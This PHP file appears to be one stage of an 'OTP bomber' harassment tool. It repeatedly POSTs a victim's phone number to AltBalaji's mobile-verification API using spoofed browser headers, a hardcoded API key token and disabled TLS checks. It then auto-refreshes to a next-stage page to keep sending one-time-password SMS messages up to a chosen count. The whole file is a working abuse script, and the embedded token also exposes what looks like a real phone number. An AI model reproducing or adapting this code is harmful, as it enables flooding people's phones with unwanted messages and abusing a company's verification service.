<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 $data='{"country_code":"91","phone_number":"'.$mobno.'","exp":1592108046933,"platform":"pwa"}';
 $url="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN";
         //header here
         $headers   = array();
        $headers[] = "Host:api.cloud.altbalaji.com";
        $headers[] = "Connection:keep-alive";
        $headers[] = "Content-Length:86";
        $headers[] = "Accept:application/json, text/plain, */*";
        $headers[] = "User-Agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "X-API-KEY:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJjb3VudHJ5X2NvZGUiOiI5MSIsInBob25lX251bWJlciI6IjkzOTk1MDkzNzQiLCJleHAiOjE1OTIxMDgwNDY5MzMsInBsYXRmb3JtIjoicHdhIn0.m2ZSnNmN5J7evi2KEXvGxNgGtJkN9oAv1G_Ubha6b24";
        $headers[] = "Content-Type:application/json;charset=UTF-8";
        $headers[] = "Origin:https://lite.altbalaji.com";
        
        
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "Referer:https://lite.altbalaji.com/subscribe?progress=input";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        $headers[] = "Accept-Language:en-US,en;q=0.9";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    




	$sentinc=$sent+1;
   $rl="21.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>
